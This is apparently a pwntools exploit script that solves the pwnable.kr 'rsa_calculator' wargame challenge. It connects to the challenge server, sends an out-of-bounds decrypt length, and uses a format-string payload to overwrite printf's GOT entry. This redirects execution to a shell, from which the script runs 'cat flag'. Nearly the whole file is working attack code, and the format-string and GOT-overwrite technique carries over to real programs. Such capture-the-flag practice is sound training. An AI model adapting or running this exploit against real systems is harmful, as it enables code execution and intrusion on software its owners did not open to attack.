from pwn import *

io = remote('pwnable.kr', 9012)
def set_key(p: int, q: int, e: int, d: int):
    io.recvuntil(b'exit\n')
    io.sendline(b'1')
    io.sendlineafter(b'p : ', str(p).encode())
    io.sendlineafter(b'q : ', str(q).encode())
    io.sendlineafter(b'e : ', str(e).encode())
    io.sendlineafter(b'd : ', str(d).encode())

# def encrypt(s: str) -> bytes
encrypt = lambda s: "".join(format(ord(i), "0x").ljust(8, "0") for i in s).encode()   
def decrypt(msg: bytes):
    io.recvuntil(b'exit\n')
    io.sendline(b'3')
    try:
        io.recvuntil(b' : ', timeout=2)
    except pwnlib.exception.TimeoutException:
        print("Timeout occurred")
    io.sendline(b'-1')
    io.recvline()
    io.sendline(msg)


elf = ELF('./rsa_calculator')
printf_got = elf.got["printf"]
p, q, e, d = 100, 100, 1, 1
set_key(p,q,e,d)
decrypt(encrypt("a" * 40) + p64(printf_got + 4) + p64(printf_got + 2) + p64(printf_got))
decrypt(encrypt("%52$n%64c%53$hn%1920c%54$hn"))
decrypt(encrypt("/bin/sh"))
# io.interactive() # or
io.sendlineafter(b'- decrypted result -\n', b'cat flag')
log.success(f"Flag: {term.text.bold_italic_yellow(io.recvline().decode().strip())}")
io.close()